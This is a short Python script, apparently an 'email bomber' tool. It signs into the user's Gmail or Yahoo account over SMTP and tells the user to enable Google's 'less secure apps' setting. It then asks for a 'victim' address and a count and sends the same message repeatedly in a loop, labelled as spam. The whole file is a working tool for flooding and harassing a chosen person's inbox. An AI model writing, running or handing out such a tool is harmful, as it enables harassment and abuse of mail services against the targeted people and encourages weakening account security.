import smtplib
from termcolor import colored

# login to your email

print(colored("""for Gmail enter 1
for Yahoo enter 2""", 'red'))
smtp = input(colored("Enter Your choice: \n", 'blue'))

if smtp == '1':
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
elif smtp == "2":
    server = smtplib.SMTP('smtp.mail.yahoo.com', 587)
    server.starttls()
else:
    exit("[-] you're stupid! run me again!")

print(colored("[!] very important go to https://myaccount.google.com/lesssecureapps end enable it!", 'red'))

email = input("enter your email here: ")
password = input("enter your password here: ")

if not email or not password:
    print("[!] You must Login to your account")

try:
    server.login(email, password)
    print("[+] Successfully Signed in as: ", email)

except smtplib.SMTPAuthenticationError:
    print("[-] wrong email or password, or try to enable less secure apps in your account ")
    exit("run me again")


def bomber():
    send = input(colored("Please Enter Your Victim Email: ", 'blue'))
    thread = int(input("Count to sent to victim: "))
    msg = input("Enter Your Message :\n")

    for count in range(int(thread)):
        server.sendmail(email, send, msg)
        print(colored("[+] spam will be start now", 'green'))
        print(count, "[+] spammed successfully!")


bomber()
